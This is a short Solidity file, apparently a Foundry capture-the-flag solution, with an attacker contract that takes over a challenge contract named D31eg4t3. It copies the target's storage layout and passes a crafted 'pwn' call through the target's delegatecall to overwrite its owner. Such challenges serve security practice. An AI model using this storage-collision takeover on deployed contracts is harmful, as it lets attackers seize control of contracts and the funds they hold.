// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/5-D31eg4t3/D31eg4t3.sol";

contract DgAttacke {
    uint256 a;
    uint8 b;
    string private d;
    uint32 private c;
    string private mot;
    address public owner;
    mapping(address => bool) public canYouHackMe;

    function attack(address delegateAddress, address attackerAddress) public {
        D31eg4t3 delegateContract = D31eg4t3(delegateAddress);
        delegateContract.hackMe(abi.encodeWithSignature("pwn(address)", attackerAddress));
    }

    function pwn(address attackerAddress) public {
        owner = attackerAddress;
        canYouHackMe[attackerAddress] = true;
    }
}

contract dgTest is Test {}
